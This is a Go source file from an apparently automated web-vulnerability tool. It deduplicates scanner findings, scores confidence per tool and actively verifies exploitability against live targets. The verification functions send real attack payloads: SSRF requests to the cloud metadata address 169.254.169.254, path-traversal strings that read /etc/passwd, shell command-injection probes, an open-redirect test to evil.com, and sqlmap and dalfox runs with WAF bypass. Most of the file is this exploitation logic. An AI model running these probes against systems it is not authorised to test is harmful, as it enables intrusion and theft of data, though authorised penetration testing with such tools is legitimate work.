// verify.go — Gap 3+4: Deduplication, Confidence Scoring, Auto-Verification
// Every finding goes through this pipeline before being reported.
package brain

import (
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

// ─── Finding Types ────────────────────────────────────────────────────────────

// RawFinding is what tools report before verification.
type RawFinding struct {
	Tool       string
	Type       string  // xss, sqli, ssrf, idor, rce, lfi, etc.
	URL        string
	Evidence   string
	Payload    string
	Severity   string
	RawOutput  string
}

// VerifiedFinding is a confirmed, deduplicated, scored finding.
type VerifiedFinding struct {
	RawFinding
	Confidence  float64 // 0.0-1.0
	Verified    bool
	VerifyProof string  // actual proof of exploitation
	Duplicate   bool
	DupOf       string  // URL of duplicate
}

// ─── Deduplication ────────────────────────────────────────────────────────────

// Dedup removes duplicate findings from a list.
// Two findings are duplicates if they have the same type + normalized URL.
func Dedup(findings []RawFinding) []RawFinding {
	seen := make(map[string]bool)
	var unique []RawFinding
	for _, f := range findings {
		key := f.Type + "|" + normalizeURL(f.URL)
		if !seen[key] {
			seen[key] = true
			unique = append(unique, f)
		}
	}
	return unique
}

// normalizeURL strips query params and fragments for dedup comparison.
func normalizeURL(u string) string {
	if idx := strings.Index(u, "?"); idx != -1 {
		u = u[:idx]
	}
	if idx := strings.Index(u, "#"); idx != -1 {
		u = u[:idx]
	}
	return strings.ToLower(strings.TrimRight(u, "/"))
}

// ─── Confidence Scoring ───────────────────────────────────────────────────────

// ScoreConfidence assigns a confidence score (0.0-1.0) to a finding.
// Based on: tool reliability, evidence quality, verification status.
func ScoreConfidence(f RawFinding) float64 {
	score := 0.5 // base

	// Tool reliability weights
	toolWeights := map[string]float64{
		"nuclei":     0.7,  // templates can have false positives
		"dalfox":     0.9,  // very accurate for XSS
		"sqlmap":     0.95, // very accurate for SQLi
		"commix":     0.9,
		"tplmap":     0.85,
		"ssrfmap":    0.8,
		"manual":     1.0,  // manually verified
		"xsstrike":   0.75,
		"kxss":       0.6,  // reflection only, not confirmed XSS
		"gf":         0.4,  // pattern match only
	}
	if w, ok := toolWeights[f.Tool]; ok {
		score = w
	}

	// Evidence quality boost
	if strings.Contains(f.Evidence, "alert(") || strings.Contains(f.Evidence, "confirm(") {
		score += 0.1 // XSS payload executed
	}
	if strings.Contains(f.Evidence, "sleep(") || strings.Contains(f.Evidence, "SLEEP(") {
		score += 0.1 // time-based SQLi
	}
	if strings.Contains(f.Evidence, "uid=") || strings.Contains(f.Evidence, "root:") {
		score += 0.2 // RCE confirmed
	}
	if f.Payload != "" {
		score += 0.05 // has specific payload
	}

	// Severity boost for critical findings
	if f.Severity == "critical" {
		score = score * 1.1
	}

	if score > 1.0 {
		score = 1.0
	}
	return score
}

// FilterByConfidence returns only findings above the threshold.
func FilterByConfidence(findings []RawFinding, minConfidence float64) []RawFinding {
	var filtered []RawFinding
	for _, f := range findings {
		if ScoreConfidence(f) >= minConfidence {
			filtered = append(filtered, f)
		}
	}
	return filtered
}

// ─── Auto-Verification ────────────────────────────────────────────────────────

// VerifyFinding attempts to confirm a finding is actually exploitable.
// Returns (verified bool, proof string).
func VerifyFinding(f RawFinding) (bool, string) {
	switch f.Type {
	case "xss":
		return verifyXSS(f.URL, f.Payload)
	case "sqli":
		return verifySQLi(f.URL, f.Payload)
	case "ssrf":
		return verifySSRF(f.URL)
	case "open-redirect":
		return verifyOpenRedirect(f.URL)
	case "lfi":
		return verifyLFI(f.URL, f.Payload)
	case "rce":
		return verifyRCE(f.URL, f.Payload)
	default:
		// For other types, use nuclei to re-verify
		return verifyWithNuclei(f.URL, f.Type)
	}
}

// verifyXSS uses dalfox to confirm XSS is actually exploitable.
func verifyXSS(url, payload string) (bool, string) {
	if _, err := exec.LookPath("dalfox"); err != nil {
		return false, "dalfox not installed"
	}
	args := []string{"url", url, "--silence", "--no-color", "--waf-bypass"}
	if payload != "" {
		args = append(args, "--custom-payload", payload)
	}
	cmd := exec.Command("dalfox", args...)
	out, err := runWithTimeout(cmd, 60)
	if err != nil {
		return false, ""
	}
	lower := strings.ToLower(out)
	if strings.Contains(lower, "poc") || strings.Contains(lower, "[v]") ||
		strings.Contains(lower, "verified") || strings.Contains(lower, "found") {
		return true, out
	}
	return false, ""
}

// verifySQLi uses sqlmap to confirm SQL injection.
func verifySQLi(url, payload string) (bool, string) {
	if _, err := exec.LookPath("sqlmap"); err != nil {
		return false, "sqlmap not installed"
	}
	cmd := exec.Command("sqlmap", "-u", url, "--batch", "--level", "1", "--risk", "1",
		"--technique", "BT", "--output-dir", "/tmp/cybermind_verify_sqli/")
	out, err := runWithTimeout(cmd, 120)
	if err != nil {
		return false, ""
	}
	if strings.Contains(out, "is vulnerable") || strings.Contains(out, "Parameter:") {
		return true, out
	}
	return false, ""
}

// verifySSRF checks if SSRF is exploitable by testing with a callback.
func verifySSRF(url string) (bool, string) {
	// Use interactsh or a simple HTTP check
	// For now, check if the URL reflects internal IPs
	client := &http.Client{Timeout: 10 * time.Second}
	testPayloads := []string{
		"http://169.254.169.254/latest/meta-data/",
		"http://127.0.0.1:80/",
		"http://[::1]:80/",
	}
	for _, payload := range testPayloads {
		resp, err := client.Get(url + "?url=" + payload)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()
		if strings.Contains(string(body), "ami-id") || strings.Contains(string(body), "instance-id") {
			return true, fmt.Sprintf("AWS metadata accessible via SSRF: %s", payload)
		}
	}
	return false, ""
}

// verifyOpenRedirect checks if redirect actually goes to external domain.
func verifyOpenRedirect(url string) (bool, string) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // don't follow redirects
		},
	}
	testURL := url
	if strings.Contains(url, "=") {
		// Replace the parameter value with external domain
		parts := strings.SplitN(url, "=", 2)
		testURL = parts[0] + "=https://evil.com"
	}
	resp, err := client.Get(testURL)
	if err != nil {
		return false, ""
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		location := resp.Header.Get("Location")
		if strings.Contains(location, "evil.com") {
			return true, fmt.Sprintf("Redirects to: %s", location)
		}
	}
	return false, ""
}

// verifyLFI checks if local file inclusion is exploitable.
func verifyLFI(url, payload string) (bool, string) {
	client := &http.Client{Timeout: 10 * time.Second}
	testPayloads := []string{
		"../../../etc/passwd",
		"....//....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	}
	if payload != "" {
		testPayloads = append([]string{payload}, testPayloads...)
	}
	for _, p := range testPayloads {
		testURL := url
		if strings.Contains(url, "=") {
			parts := strings.SplitN(url, "=", 2)
			testURL = parts[0] + "=" + p
		}
		resp, err := client.Get(testURL)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()
		if strings.Contains(string(body), "root:x:0:0") || strings.Contains(string(body), "/bin/bash") {
			return true, fmt.Sprintf("LFI confirmed: /etc/passwd readable with payload: %s", p)
		}
	}
	return false, ""
}

// verifyRCE checks if remote code execution is possible.
func verifyRCE(url, payload string) (bool, string) {
	// Use a unique marker to detect RCE
	marker := fmt.Sprintf("cybermind_%d", time.Now().UnixNano()%100000)
	client := &http.Client{Timeout: 15 * time.Second}

	testPayloads := []string{
		fmt.Sprintf("echo %s", marker),
		fmt.Sprintf("`echo %s`", marker),
		fmt.Sprintf("$(echo %s)", marker),
	}
	for _, p := range testPayloads {
		testURL := url
		if strings.Contains(url, "=") {
			parts := strings.SplitN(url, "=", 2)
			testURL = parts[0] + "=" + p
		}
		resp, err := client.Get(testURL)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()
		if strings.Contains(string(body), marker) {
			return true, fmt.Sprintf("RCE confirmed: marker '%s' reflected in response", marker)
		}
	}
	return false, ""
}

// verifyWithNuclei re-runs nuclei on a specific URL with targeted templates.
func verifyWithNuclei(url, findingType string) (bool, string) {
	if _, err := exec.LookPath("nuclei"); err != nil {
		return false, "nuclei not installed"
	}
	tagMap := map[string]string{
		"exposure":      "exposure",
		"misconfig":     "misconfig",
		"takeover":      "takeover",
		"default-login": "default-logins",
		"cve":           "cve",
	}
	tag := "misconfiguration"
	if t, ok := tagMap[findingType]; ok {
		tag = t
	}
	cmd := exec.Command("nuclei", "-u", url, "-tags", tag,
		"-severity", "critical,high,medium", "-silent", "-no-color")
	out, err := runWithTimeout(cmd, 60)
	if err != nil {
		return false, ""
	}
	if strings.TrimSpace(out) != "" {
		return true, out
	}
	return false, ""
}

// runWithTimeout runs a command with a timeout and returns output.
func runWithTimeout(cmd *exec.Cmd, timeoutSec int) (string, error) {
	done := make(chan error, 1)
	var outBuf strings.Builder
	cmd.Stdout = &outBuf
	cmd.Stderr = &outBuf

	go func() { done <- cmd.Run() }()

	select {
	case err := <-done:
		return outBuf.String(), err
	case <-time.After(time.Duration(timeoutSec) * time.Second):
		if cmd.Process != nil {
			cmd.Process.Kill()
		}
		return outBuf.String(), fmt.Errorf("timeout after %ds", timeoutSec)
	}
}
